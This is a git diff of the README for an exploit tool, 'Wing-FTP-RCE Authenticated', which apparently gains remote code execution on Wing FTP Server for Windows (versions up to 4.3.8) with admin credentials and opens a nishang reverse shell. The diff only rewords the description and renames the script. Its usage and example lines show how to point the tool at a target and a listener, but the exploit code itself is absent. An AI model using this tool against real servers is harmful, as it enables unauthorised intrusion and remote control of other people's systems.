@@ -1,5 +1,5 @@
 # Wing-FTP-RCE Authenticated
-This is a Python3 exploit for the Wing FTP Server running on Windows that requires admin panel authentication.
+This is an exploit written in Python3 for the Wing FTP Server running on Windows. This exploit requires Wing FTP's admin panel authentication.
 
 ## Tested versions
 <=4.3.8
@@ -12,9 +12,9 @@ This exploit will invoke a nishang tcp reverse shell on the target. Start your l
 
 #Usage:
 ```
-final.py <TARGET> <TARGET_PORT> <LOCAL_IP> <LOCAL_PORT> <USER> <PASSWORD>
+ wingrce.py <TARGET> <TARGET_PORT> <LOCAL_IP> <LOCAL_PORT> <USER> <PASSWORD>
 ```
 #Example:
 ```
-final.py 0.0.0.0 8000 127.0.0.1 9001 notcos coolpass
+wingrce.py 0.0.0.0 8000 127.0.0.1 9001 notcos coolpass
 ```
